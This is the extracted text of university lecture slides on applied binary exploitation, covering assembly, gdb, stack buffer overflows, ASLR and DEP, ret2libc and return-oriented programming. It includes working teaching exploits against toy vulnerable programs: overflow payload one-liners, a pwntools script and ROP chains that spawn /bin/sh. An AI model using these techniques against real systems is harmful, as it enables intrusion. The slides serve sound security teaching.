IT Security
AppliedBinaryExploitation
BenSwierzy
swierzy@cs.uni-bonn.de
FraunhoferFKIE
UniversityofBonn|InstituteofComputerScience4
LectureITSecurity| UniBonn| WT2025/26
Contents
StaticAnalysis
DynamicAnalysis
BufferOverflows
Return-orientedProgramming
3
Static Analysis
Assembler
1 #include <stdio.h>
4 printf("Hello world!");
2
5 return 0;
6 }
3 int main() {
1 .LC0:
2.string "Hello world!"
3 main:
4 push rbp
5 mov rbp, rsp
6 lea rax, .LC0[rip]
7 mov rdi, rax
8 mov eax, 0
10 11 12 9 call printf@PLT
mov eax, 0
pop rbp
ret
4
Registers
General Purpose Registers (64 bit):
rax, rbx, rcx, rdx, rbp, rsp, rdi, rsi,
r8, r9, r10, r11, r12, r13, r14, r15
General Purpose Registers (32 bit):
eax, ebx, ecx, edx, ebp, esp, edi, esi,
r8d, r9d, r10d, r11d, r12d, r13d, r14d, r15d
Special Purpose Registers:
rip
5
Assembler: Intel Syntax
mov rbp, rsp
Mnemonic:movinstructionscopydataintoregistersandmemory.
Target Operand:Thedataiscopiedintotherbpregister.
Source Operand:Thedataiscopiedfromtherspregister.
6
Assembler: Memory Operands
mov rax, [rbx+rcx*8]
Base Register
Index Register
Offset Constant
7
Assembler: Basic Instructions
mov Copiesdata
push Pushesoperandontothestack
pop Retrievesvaluefromthestack
add Addssourceontothetarget
xor XORstwooperandsandwritestothetarget
shl Shifttargettotheleftbysourcebits
syscall Askstheoperatingsystemforassistance
8
Assembler: Control Flow Instructions
jmp Modifyinstructionpointer
cmp Substractssourcefromtargetandsetsflags
j* Conditionaljump
je Jumpifequal
call Callsafunction
ret Returnstocaller
9
Disassembling: objdump
$ objdump --disassemble=main -Mintel /tmp/helloworld
/tmp/helloworld: file format elf64-x86-64
Disassembly of section .text:
0000000000001139 <main>:
1139: 55 push rbp
113a: 48 89 e5 mov rbp,rsp
113d: 48 8d 05 c0 0e 00 00 lea rax,[rip+0xec0] # 2004 <_IO_stdin_used+0x4>
1144: 48 89 c7 mov rdi,rax
1147: b8 00 00 00 00 mov eax,0x0
114c: e8 df fe ff ff call 1030 <printf@plt>
1151: b8 00 00 00 00 mov eax,0x0
1156: 5d pop rbp
1157: c3 ret
10
Disassembling: objdump
$ objdump -d -Mintel /tmp/helloworld
/tmp/helloworld: file format elf64-x86-64
Disassembly of section .init:
0000000000001000 <_init>:
1000: f3 0f 1e fa endbr64
1004: 48 83 ec 08 sub rsp,0x8
1008: 48 8b 05 c1 2f 00 00 mov rax,QWORD PTR [rip+0x2fc1] # 3fd0 <__gmon_start__@Base>
100f: 48 85 c0 test rax,rax
1012: 74 02 je 1016 <_init+0x16>
1014: ff d0 call rax
1016: 48 83 c4 08 add rsp,0x8
101a: c3 ret
Disassembly of section .plt:
0000000000001020 <printf@plt-0x10>:
1020: ff 35 ca 2f 00 00 push QWORD PTR [rip+0x2fca] # 3ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
1026: ff 25 cc 2f 00 00 jmp QWORD PTR [rip+0x2fcc] # 3ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
102c: 0f 1f 40 00 nop DWORD PTR [rax+0x0]
0000000000001030 <printf@plt>:
1030: ff 25 ca 2f 00 00 jmp QWORD PTR [rip+0x2fca] # 4000 <printf@GLIBC_2.2.5>
1036: 68 00 00 00 00 push 0x0
103b: e9 e0 ff ff ff jmp 1020 <_init+0x20>
[...] 11
Questions?
Dynamic Analysis
Dynamic Analysis: Motivation
0000000000001119 <secret>:
1119: 48 85 ff test rdi,rdi
111c: 7e 24 jle 1142 <secret+0x29>
111e: 48 01 ff add rdi,rdi
1121: ba 00 00 00 00 mov edx,0x0
1126: b8 ef bd 48 43 mov eax,0x4348bdef
112b: 48 c1 e0 03 shl rax,0x3
112f: 48 89 c1 mov rcx,rax
1132: 48 29 d1 sub rcx,rdx
1135: 48 31 c8 xor rax,rcx
1138: 48 83 c2 02 add rdx,0x2
113c: 48 39 fa cmp rdx,rdi
113f: 75 ea jne 112b <secret+0x12>
1141: c3 ret
1142: b8 ef bd 48 43 mov eax,0x4348bdef
1147: c3 ret
Whatistheresultofsecret(42)?
12
The GNU Debugger
Howdoesa
debuggerhelpus?
Execution
Breakpoints
Inspectmemory
Changememory
CCBY-SAAndreasArnez
13
gdbSession
$ gdb ./secret
GNU gdb (GDB) 13.2
Copyright (C) 2023 Free Software Foundation, Inc.
(gdb) run
Starting program: /tmp/secret
[Inferior 1 (process 32248) exited normally]
(gdb) break main
Breakpoint 1 at 0x555555555168
(gdb) run
Starting program: /tmp/secret
Breakpoint 1, 0x0000555555555168 in main ()
(gdb) disassemble
Dump of assembler code for function main:
=> 0x0000555555555168 <+0>: mov eax,0x0
0x000055555555516d <+5>: cmp edi,0x1
0x0000555555555170 <+8>: jg 0x555555555173 <main+11>
0x0000555555555172 <+10>: ret
0x0000555555555173 <+11>: sub rsp,0x8
0x0000555555555177 <+15>: mov rdi,QWORD PTR [rsi+0x8]
[...]
14
gdbSession
(gdb) nexti
0x000055555555516d in main ()
(gdb) disassemble
Dump of assembler code for function main:
0x0000555555555168 <+0>: mov eax,0x0
=> 0x000055555555516d <+5>: cmp edi,0x1
0x0000555555555170 <+8>: jg 0x555555555173 <main+11>
0x0000555555555172 <+10>: ret
0x0000555555555173 <+11>: sub rsp,0x8
0x0000555555555177 <+15>: mov rdi,QWORD PTR [rsi+0x8]
0x000055555555517b <+19>: mov edx,0xa
0x0000555555555180 <+24>: mov esi,0x0
0x0000555555555185 <+29>: call 0x555555555030 <strtol@plt>
0x000055555555518a <+34>: movsxd rdi,eax
0x000055555555518d <+37>: call 0x555555555139 <secret>
0x0000555555555192 <+42>: add rsp,0x8
0x0000555555555196 <+46>: ret
End of assembler dump.
15
gdbSession
(gdb) nexti
0x0000555555555170 in main ()
(gdb) disassemble
Dump of assembler code for function main:
0x0000555555555168 <+0>: mov eax,0x0
0x000055555555516d <+5>: cmp edi,0x1
=> 0x0000555555555170 <+8>: jg 0x555555555173 <main+11>
0x0000555555555172 <+10>: ret
0x0000555555555173 <+11>: sub rsp,0x8
0x0000555555555177 <+15>: mov rdi,QWORD PTR [rsi+0x8]
0x000055555555517b <+19>: mov edx,0xa
0x0000555555555180 <+24>: mov esi,0x0
0x0000555555555185 <+29>: call 0x555555555030 <strtol@plt>
0x000055555555518a <+34>: movsxd rdi,eax
0x000055555555518d <+37>: call 0x555555555139 <secret>
0x0000555555555192 <+42>: add rsp,0x8
0x0000555555555196 <+46>: ret
End of assembler dump.
16
gdbSession
(gdb) nexti
0x0000555555555172 in main ()
(gdb) disassemble
Dump of assembler code for function main:
0x0000555555555168 <+0>: mov eax,0x0
0x000055555555516d <+5>: cmp edi,0x1
0x0000555555555170 <+8>: jg 0x555555555173 <main+11>
=> 0x0000555555555172 <+10>: ret
0x0000555555555173 <+11>: sub rsp,0x8
0x0000555555555177 <+15>: mov rdi,QWORD PTR [rsi+0x8]
0x000055555555517b <+19>: mov edx,0xa
0x0000555555555180 <+24>: mov esi,0x0
0x0000555555555185 <+29>: call 0x555555555030 <strtol@plt>
0x000055555555518a <+34>: movsxd rdi,eax
0x000055555555518d <+37>: call 0x555555555139 <secret>
0x0000555555555192 <+42>: add rsp,0x8
0x0000555555555196 <+46>: ret
End of assembler dump.
17
gdbSession
(gdb) set $pc = 0x000055555555518d
(gdb) stepi
0x0000555555555139 in secret ()
(gdb) disassemble
Dump of assembler code for function secret:
=> 0x0000555555555139 <+0>: test rdi,rdi
0x000055555555513c <+3>: jle 0x555555555162 <secret+41>
0x000055555555513e <+5>: add rdi,rdi
0x0000555555555141 <+8>: mov edx,0x0
0x0000555555555146 <+13>: mov eax,0x4348bdef
0x000055555555514b <+18>: shl rax,0x3
0x000055555555514f <+22>: mov rcx,rax
0x0000555555555152 <+25>: sub rcx,rdx
0x0000555555555155 <+28>: xor rax,rcx
0x0000555555555158 <+31>: add rdx,0x2
0x000055555555515c <+35>: cmp rdx,rdi
0x000055555555515f <+38>: jne 0x55555555514b <secret+18>
0x0000555555555161 <+40>: ret
0x0000555555555162 <+41>: mov eax,0x4348bdef
0x0000555555555167 <+46>: ret
End of assembler dump. 18
gdbSession
(gdb) set $rdi = 42
(gdb) break *secret+40
Breakpoint 2 at 0x555555555161
(gdb) continue
Continuing.
Breakpoint 2, 0x0000555555555161 in secret ()
(gdb) info register
rax 0xae 174
rbx 0x7fffffffdf08 140737488346888
rcx 0x62e 1582
rdx 0x54 84
rsi 0x7fffffffdf08 140737488346888
rdi 0x54 84
rbp 0x1 0x1
rsp 0x7fffffffddf0 0x7fffffffddf0
[...]
(gdb) kill
[Inferior 1 (process 33824) killed]
19
Mini-Reference for gdb
run r Startprogramwitharguments
break b Setabreakpoint
nexti ni Stepoverinstruction
stepi si Stepintoinstruction
continue c Continueexecutionwhenexecutionispaused
disassemble Disassemblecurrentcontext
kill k Killprocess
set Changeregisters,memorycontentsandsettings
20
Mini-Reference for gdb
RecommendedSettings:
set disassembly-flavor intel
set confirm off
set pagination off
set print pretty on
DataExamination:
info registers <register list> Printregisters
x(/nfu) <addr> Examinememory(number,format,unit)
x/10i $pc Printnext10instructions
x/-6w $sp Printlast6wordsonthestack
x/s 0x404028 Printstringat0x404028
21
Questions?
Buffer Overflows
Overflowing Buffers in C
#include <string.h>
int main() {
char buffer[4];
strcpy(buffer, "ABC");
return 0;
}
23
Overflowing Buffers in C
#include <string.h>
int main() {
char buffer[4];
strcpy(buffer, "ABCD1234");
return 0;
}
24
Overflowing Buffers in C
$ man strcpy
char *strcpy(char *restrict dst, const char *restrict src);
Thisfunctioncopiesthestringpointedtobysrc,intoastringatthebufferpointed
tobydst. Theprogrammerisresponsibleforallocatingadestinationbufferlarge
enough,thatis,strlen(src) + 1.
25
Overflowing Buffers in C
$ man memcpy
void *memcpy(void dest[restrict .n], const void src[restrict .n],
size_t n);
Thememcpy()functioncopiesnbytesfrommemoryareasrctomemoryareadest.
Thememoryareasmustnotoverlap.
26
Overflowing Buffers in C
$ man gets
[[deprecated]] char *gets(char *s);
Neverusethisfunction.
gets() readsalinefromstdin intothebufferpointedtobys untileitheratermi-
natingnewlineorEOF,whichitreplaceswithanullbyte('\0').Nocheckforbuffer
overrunisperformed.
27
Overflowing Buffers in C
#include <stdio.h>
int main() {
char buffer[4];
strcpy(buffer, "ABCD1234");
return 0;
}
28
int main() {
long x, y;
x = 3;
y = 5;
return x+y;
}
Stack Frames
main:
push rbp
mov rbp, rsp
sub rsp, 16
mov QWORD PTR [rbp-8], 3
mov QWORD PTR [rbp-16], 5
mov rdx, QWORD PTR [rbp-8]
mov rax, QWORD PTR [rbp-16]
add rax, rdx
mov rsp, rbp
pop rbp
ret
29
Stack Frames
1 main:
2 push rbp
3 mov rbp, rsp
4 sub rsp, 16
5 mov QWORD PTR [rbp-8], 3
6 mov QWORD PTR [rbp-16], 5
10 11 12 7 mov rdx, QWORD PTR [rbp-8]
8 mov rax, QWORD PTR [rbp-16]
9 add rax, rdx
mov rsp, rbp
pop rbp
ret
0x0000 0000 0000
...... .... ....
0x7FFF FFFF FFD0
y=5 y=5
0x7FFF FFFF FFD8
x=3
0x7FFF FFFF FFE0
saved rbp saved rbp saved rbp saved rbp
0x7FFF FFFF FFE8
saved rip saved rip
0x7FFF FFFF FFF0
0x7FFF FFFF FFF8
rbp
rsp
30
Calling Convention: System V (64 bit)
Parameters:
rdi,rsi,rdx,rcx,
r8,r9,stack
Return value:
rax
Clean-Up:
Caller
Preserves:
Everythingexceptrax,
rcx,rdx
Instructions
push 7
// Function declaration
mov r9, 6
void func(long a, long b, long c,
mov r8d, 5
int d, int e, long f, int g);
mov ecx, 4
mov rdx, 3
// Function call
mov rsi, 2
func(1, 2, 3, 4, 5, 6, 7);
mov rdi, 1
call func
add rsp, 8
31
#include <stdio.h>
#include <string.h>
int main() {
char buffer[8];
int isAdmin = 0;
puts("Enter password:");
gets(buffer);
if (strcmp(buffer, "secret") == 0) {
isAdmin = 42;
}
if (isAdmin == 42) puts("Logged in");
else puts("Invalid password");
Overflowing Buffers in C
0x0000 0000 0000
...... .... ....
0x7FFF FFFF DD24
0x7FFF FFFF DD28
0x7FFF FFFF DD2C
0x7FFF FFFF DD30
0x7FFF FFFF DD34
0x7FFF FFFF DD38
0x7FFF FFFF DD3C
...... .... ....
buffer 0-3
buffer 4-7
isAdmin
saved rbp
saved rbp
ret addr
ret addr
return 0;
}
Caution:Thestackcellsinthisanimationhaveonly4bytes!
Testityourself:gcc -o test -fno-stack-protector -Wno-implicit-function-declaration test.c; echo -en 'AAAABBBB\x2a\x00\x00\x00\x0a' | ./test
32
#include <stdio.h>
#include <string.h>
int main() {
char buffer[8];
int isAdmin = 0;
puts("Enter password:");
gets(buffer);
if (strcmp(buffer, "secret") == 0) {
isAdmin = 42;
}
if (isAdmin == 42) puts("Logged in");
else puts("Invalid password");
Overflowing Buffers in C
0x0000 0000 0000
...... .... ....
0x7FFF FFFF DD24
0x7FFF FFFF DD28
0x7FFF FFFF DD2C
0x7FFF FFFF DD30
0x7FFF FFFF DD34
0x7FFF FFFF DD38
0x7FFF FFFF DD3C
...... .... ....
41 41 41 41
42 42 42 42
2A 00 00 00
00 ?? ?? ??
saved rbp
ret addr
ret addr
return 0;
}
Caution:Thestackcellsinthisanimationhaveonly4bytes!
Testityourself:gcc -o test -fno-stack-protector -Wno-implicit-function-declaration test.c; echo -en 'AAAABBBB\x2a\x00\x00\x00\x0a' | ./test
32
Overflowing Buffers in C
#include <stdio.h>
$ env -i gdb ./test
#include <stdlib.h>
(gdb) b convince
Breakpoint 1 at 0x117a
void secret_func() {
puts("You convinced me!");
(gdb) r
exit(42);
Starting program: /tmp/test
}
void convince() {
Breakpoint 1, 0x000055555555518a in convince ()
char buffer[32];
(gdb) p secret_func
puts("Convince me to tell you my secret:");
gets(buffer);
$1 = {<text variable, no debug info>}
}
0x555555555169 <secret_func>
int main() {
convince();
puts("I am not convinced");
return -1;
}
Testityourself:
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
gcc -o test -fno-stack-protector -Wno-implicit-function-
declaration test.c
python -c "print('A'*40 + '\x69\x51\x55\x55\x55\x55\x00\x00')" |
env -i ./test
Inputconstruction:
Fillbuffer
Fillrbp
Overwritereturnaddress
Remembertheendianness!
33
Questions?
Overflowing Buffers in C
#include <stdio.h>
void convince() {
char buffer[32];
puts("Convince me to tell you my secret:");
gets(buffer);
}
Howcanweexecuteourowncode?
int main() {
convince();
puts("I am not convinced");
return -1;
}
35
Mitigations
DEP-DataExecutionPreventiondisablesexecutionofmemorysegments
StackCanary-Randomvaluegettingcheckedbeforereturn
ASLR-Programgetslocatedatrandomaddressinmemory
36
DEP and ASLR
$ cat /proc/`pgrep test`/maps
560c91706000-560c91707000 r--p 00000000 00:25 140 /tmp/test
560c91707000-560c91708000 r-xp 00001000 00:25 140 /tmp/test
560c91708000-560c91709000 r--p 00002000 00:25 140 /tmp/test
560c91709000-560c9170a000 r--p 00002000 00:25 140 /tmp/test
560c9170a000-560c9170b000 rw-p 00003000 00:25 140 /tmp/test
560c9fdde000-560c9fdff000 rw-p 00000000 00:00 0 [heap]
7f0f16200000-7f0f16224000 r--p 00000000 fd:00 527872 /usr/lib/libc.so.6
7f0f16224000-7f0f16396000 r-xp 00024000 fd:00 527872 /usr/lib/libc.so.6
7f0f16396000-7f0f16405000 r--p 00196000 fd:00 527872 /usr/lib/libc.so.6
7f0f16405000-7f0f16409000 r--p 00204000 fd:00 527872 /usr/lib/libc.so.6
7f0f16409000-7f0f1640b000 rw-p 00208000 fd:00 527872 /usr/lib/libc.so.6
7f0f1640b000-7f0f16413000 rw-p 00000000 00:00 0
7f0f165ff000-7f0f16604000 rw-p 00000000 00:00 0
7f0f16645000-7f0f16649000 r--p 00000000 00:00 0 [vvar]
7f0f16649000-7f0f1664b000 r--p 00000000 00:00 0 [vvar_vclock]
7f0f1664b000-7f0f1664d000 r-xp 00000000 00:00 0 [vdso]
7f0f1664d000-7f0f1664e000 r--p 00000000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f1664e000-7f0f16678000 r-xp 00001000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16678000-7f0f16686000 r--p 0002b000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16686000-7f0f16688000 r--p 00039000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16688000-7f0f16689000 rw-p 0003b000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16689000-7f0f1668a000 rw-p 00000000 00:00 0
7fff201b1000-7fff201d2000 rw-p 00000000 00:00 0 [stack]
37
How to work around ASLR
from pwn import *
#include <stdio.h>
p = process("./aslr")
#include <stdlib.h>
output = p.recvuntil(b"
... \n")
output_offset = output.find(b"0x")
convince_addr = int(output[output_offset:output_offset+14], 16)
void secret_func() {
puts("You convinced me!");
print(f"{convince_addr=:x}")
exit(42);
secret_addr = convince_addr - 0x1d
}
payload = b"A" * 32
payload += p64(0xdeadbeef) # rbp
void convince() {
char buffer[32];
payload += p64(secret_addr) # ret addr
p.send(payload + b"\n")
puts("Convince me to tell you my secret:");
print(p.readall().decode())
printf("[INFO] convince at %p waits for data ... \n", convince
);
gets(buffer);
}
int main() {
convince();
puts("I am not convinced");
return -1;
}
Inputconstruction:
Fillbuffer
Fillrbp
Overwritereturnaddress
Remembertheendianness!
38
LIVE DEMO
DEP and ASLR
$ cat /proc/`pgrep test`/maps
560c91706000-560c91707000 r--p 00000000 00:25 140 /tmp/test
560c91707000-560c91708000 r-xp 00001000 00:25 140 /tmp/test
560c91708000-560c91709000 r--p 00002000 00:25 140 /tmp/test
560c91709000-560c9170a000 r--p 00002000 00:25 140 /tmp/test
560c9170a000-560c9170b000 rw-p 00003000 00:25 140 /tmp/test
560c9fdde000-560c9fdff000 rw-p 00000000 00:00 0 [heap]
7f0f16200000-7f0f16224000 r--p 00000000 fd:00 527872 /usr/lib/libc.so.6
7f0f16224000-7f0f16396000 r-xp 00024000 fd:00 527872 /usr/lib/libc.so.6
7f0f16396000-7f0f16405000 r--p 00196000 fd:00 527872 /usr/lib/libc.so.6
7f0f16405000-7f0f16409000 r--p 00204000 fd:00 527872 /usr/lib/libc.so.6
7f0f16409000-7f0f1640b000 rw-p 00208000 fd:00 527872 /usr/lib/libc.so.6
7f0f1640b000-7f0f16413000 rw-p 00000000 00:00 0
7f0f165ff000-7f0f16604000 rw-p 00000000 00:00 0
7f0f16645000-7f0f16649000 r--p 00000000 00:00 0 [vvar]
7f0f16649000-7f0f1664b000 r--p 00000000 00:00 0 [vvar_vclock]
7f0f1664b000-7f0f1664d000 r-xp 00000000 00:00 0 [vdso]
7f0f1664d000-7f0f1664e000 r--p 00000000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f1664e000-7f0f16678000 r-xp 00001000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16678000-7f0f16686000 r--p 0002b000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16686000-7f0f16688000 r--p 00039000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16688000-7f0f16689000 rw-p 0003b000 fd:00 527844 /usr/lib/ld-linux-x86-64.so.2
7f0f16689000-7f0f1668a000 rw-p 00000000 00:00 0
7fff201b1000-7fff201d2000 rw-p 00000000 00:00 0 [stack]
39
Overflowing Buffers in C: ret2libc
#include <stdio.h>
void convince() {
char buffer[32];
puts("Convince me to tell you my secret:");
gets(buffer);
}
Howcanweexecutealibcfunction?
Andwhatfunctionshouldwecall?
int main() {
convince();
puts("I am not convinced");
return -1;
}
40
system()
system(3) Library Functions Manual system(3)
NAME
system - execute a shell command
LIBRARY
Standard C library (libc, -lc)
SYNOPSIS
#include <stdlib.h>
int system(const char *command);
DESCRIPTION
The system() library function behaves as if it used fork(2) to create a child
process that executed the shell command specified in command using execl(3) as follows:
execl("/bin/sh", "sh", "-c", command, (char *) NULL);
system() returns after the command has been completed.
41
How to call a 64-bit libc function?
Remember the System V calling convention
Return-Oriented Programming
ROP: Basic Idea
locals
Weneedtopreparetheregisterswithfewinstructions.
Foroursystem("/bin/sh")call,wejustneedtosetrdi.
Thisispossiblewithapop rdi; retinstructionsequence.
saved rbp
saved rip &(pop rdi; ret)
arg 1 &"/bin/sh"
arg 2 system()
...
Usually,ourprocessmemorycontainslotsofsuitablegadgets.
...
42
Computing offsets
$ nm -D /usr/lib/libc.so.6 | grep system
0000000000051c30 T __libc_system@@GLIBC_PRIVATE
0000000000161220 T svcerr_systemerr@GLIBC_2.2.5
0000000000051c30 W system@@GLIBC_2.2.5 <---
$ grep -abo /bin/sh /usr/lib/libc.so.6
1769027:/bin/sh
$ ROPgadget --binary /usr/lib/libc.so.6 --no --depth 3 | grep "pop"
0x0000000000101c17 : pop r12 ; ret
0x0000000000040f4e : pop rax ; leave ; ret
0x00000000000d2cb7 : pop rax ; ret
0x000000000002c7a4 : pop rax ; retf 0x18
0x000000000016dd2c : pop rbp ; cld ; ret 0x41c4
0x0000000000051bc4 : pop rbx ; ret
0x000000000009fe8e : pop rcx ; ret
0x000000000002630b : pop rdi ; pop rbp ; ret
0x000000000002493d : pop rdi ; ret <---
Note:Theoffsetsaredependingontheexactlibraryversionanddistribution.
Thedepthcanbeincreasedtofindevenmoregadgets
43
ret2libc ROP chain in action
Goal: Execute system(/bin/sh)
Target:
0x0000000000051c30 W system@@GLIBC_2.2.5
Parameter:
*libc + 0x2493d
*libc + 1769027
*libc + 0x51c30
1769027:/bin/sh
Gadget:
0x000000000002493d : pop rdi ; ret
44
ret2libc ROP chain in action
Execution:
*libc + 0x2493d *libc + 0x2493d
*libc + 1769027 *libc + 1769027
*libc + 0x51c30 *libc + 0x51c30
1 [...] ret
2 pop rdi # rdi =
"/bin/sh"
3 ret
4 system("/bin/sh")
45
LIVE DEMO
Memory Layout
Whataboutthisbinary?
$ cat /proc/`pgrep test2`/maps
0x555555554000 0x555555555000 r--p 1000 0 /tmp/test2
0x555555555000 0x555555556000 r-xp 1000 1000 /tmp/test2
0x555555556000 0x555555557000 r--p 1000 2000 /tmp/test2
0x555555557000 0x555555558000 r--p 1000 2000 /tmp/test2
0x7ffff7fbf000 0x7ffff7fc1000 rw-p 2000 0 [anon_7ffff7fbf]
0x7ffff7fc1000 0x7ffff7fc5000 r--p 4000 0 [vvar]
0x7ffff7fc5000 0x7ffff7fc7000 r-xp 2000 0 [vdso]
0x7ffff7fc7000 0x7ffff7fc8000 r--p 1000 0 /usr/lib/ld-linux-x86-64.so.2
0x7ffff7fc8000 0x7ffff7ff1000 r-xp 29000 1000 /usr/lib/ld-linux-x86-64.so.2
0x7ffff7ff1000 0x7ffff7ffb000 r--p a000 2a000 /usr/lib/ld-linux-x86-64.so.2
0x7ffff7ffb000 0x7ffff7fff000 rw-p 4000 34000 /usr/lib/ld-linux-x86-64.so.2
0x7ffffffde000 0x7ffffffff000 rw-p 21000 0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp 1000 0 [vsyscall]
46
ROPgadget
$ ROPgadget --binary /usr/lib/ld-linux-x86-64.so.2 --nojop --depth 3 | grep "pop"
0x0000000000014f1e : in al, dx ; pop rbp ; ret
0x0000000000001112 : pop r12 ; ret
0x000000000000530c : pop r13 ; ret
0x0000000000004239 : pop r14 ; ret
0x0000000000003904 : pop r15 ; ret
0x0000000000007754 : pop rax ; ret
0x0000000000001417 : pop rbp ; ret
0x0000000000001416 : pop rbx ; pop rbp ; ret
0x0000000000001512 : pop rbx ; ret
0x000000000000198c : pop rdi ; pop rbp ; ret
0x0000000000003905 : pop rdi ; ret
0x0000000000014dad : pop rdi ; ret 0
0x000000000001adf3 : pop rdx ; pop rbx ; ret
0x000000000000d3b2 : pop rdx ; retf 1
0x0000000000006ba5 : pop rsi ; pop rbp ; ret
0x000000000000423a : pop rsi ; ret
0x0000000000001113 : pop rsp ; ret
47
sys_execve
48
Loader ROP chain in action
Goal: Execute /bin/shonly with loader gadgets.
Gadgets:
0x0000000000003905 : pop rdi ; ret
0x000000000000423a : pop rsi ; ret
0x0000000000007754 : pop rax ; ret
0x000000000000ab21 : syscall
0x000000000001adf3 : pop rdx ; pop rbx ; ret
*ld + 0x7754 *ld + 0x7754
0x3b
*ld + 0x423a
0x0
*ld + 0x1adf3
0x0
/bin/sh\0
*ld + 0x3905
rsp - 16
*ld + 0xab21
49
ROP chain in action
Execution:
*ld + 0x7754 *ld + 0x7754
0x3b 0x3b
*ld + 0x423a *ld + 0x423a
0x0 0x0
*ld + 0x1adf3 *ld + 0x1adf3
0x0 0x0
/bin/sh\0 /bin/sh\0
*ld + 0x3905 *ld + 0x3905
rsp - 16 rsp - 16
*ld + 0xab21 *ld + 0xab21
1 pop rax 2 ret
3 pop rsi 4 ret
5 pop rdx 6 pop rbx 7 ret
10 # rax = 59
# rsi = 0
# rdx = 0
# rbx =
"/bin/sh\0"
8 pop rdi # rdi = &"/bin/sh\0"
9 ret
syscall
50
Bootstrapping Shellcode
Ifyourshellcodeisalreadyin-memory,youcanmakeitexecutableandjumpintoit.
int mprotect(void *addr, size_t len, int prot);
prot = PROT_READ | PROT_WRITE | PROT_EXEC
Thisapproachisuseful,ifyourgadgetsarelimitedorthelengthofyourROPchainis
limited.
51
mprotect ROP chain idea
Knowledgerequired:
Baselibraryaddress
(Bufferaddress)
ExampleROPchain:
&pop rdi
aligned &buf
&pop rsi
buflength
&pop rdx
7
&mprotect@libc
&buf
52
Questions?
Further Topics
StackPivoting
S-ROP,JOP
Moremitigations
Formatstrings
Heapinternals
UseAfterFree
tcachePoisoning
UnlinkExploit
HouseofOrange
54
Ben Swierzy
Fraunhofer FKIE
University of Bonn | Institute of Computer Science 4
swierzy@cs.uni-bonn.de